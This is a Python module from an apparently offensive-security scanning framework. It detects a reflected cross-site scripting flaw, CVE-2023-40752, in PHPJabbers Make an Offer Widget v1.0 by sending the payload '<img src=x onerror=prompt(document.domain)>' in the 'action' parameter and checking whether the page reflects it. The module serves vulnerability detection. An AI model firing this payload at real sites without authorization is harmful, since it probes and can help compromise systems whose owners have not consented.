#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""There is a Cross Site Scripting (XSS) vulnerability in the "action" parameter of index."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'PHPJabbers Make an Offer Widget v1.0 - Cross-Site Scripting Detection',
        'description': 'There is a Cross Site Scripting (XSS) vulnerability in the "action" parameter of index.php in PHPJabbers Make an Offer Widget v1.0.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'phpjabbers', 'make-an-offer-widget', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://medium.com/@tfortinsec/multiple-vulnerabilities-in-phpjabbers-part-3-40fc3565982f',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-40752',
        ],
        'cve': 'CVE-2023-40752',
    }

    def run(self):
        path = '/index.php?controller=pjAdmin&action=%3Cimg+src%3Dx+onerror%3Dprompt%28document.domain%29%3E'
        r = self.http_request(method='POST', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        body_all = ('<img src=x onerror=prompt(document.domain)>', "didn't exists",)
        ctype_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)):
            self.set_info(
                severity='medium',
                reason='PHPJabbers Make an Offer Widget v1.0 - Cross-Site Scripting detected',
                path=path,
            )
            return True
        return False

